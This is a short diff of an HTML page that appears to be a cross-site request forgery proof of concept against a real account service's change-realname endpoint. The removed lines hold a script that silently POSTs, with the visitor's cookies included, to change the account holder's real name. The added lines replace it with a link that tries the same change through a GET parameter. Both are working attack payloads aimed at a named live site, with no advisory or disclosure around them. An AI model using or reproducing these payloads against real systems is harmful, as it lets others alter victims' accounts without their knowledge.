@@ -1,15 +1,9 @@
 <!doctype html>
 <html>
 <body>
-<script>
-fetch("https://account.arena.net/modals/change-realname.json", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-        "Content-Type": "text/plain"
-    },
-    body: '{"_formName":"change-realname","realname":"CSRF-TEST"}'
-}).catch(console.error);
-</script>
+  <a href="https://account.arena.net/modals/change-realname.json?realname=CSRF-GET-TEST"
+     target="_blank">
+    Test
+  </a>
 </body>
 </html>
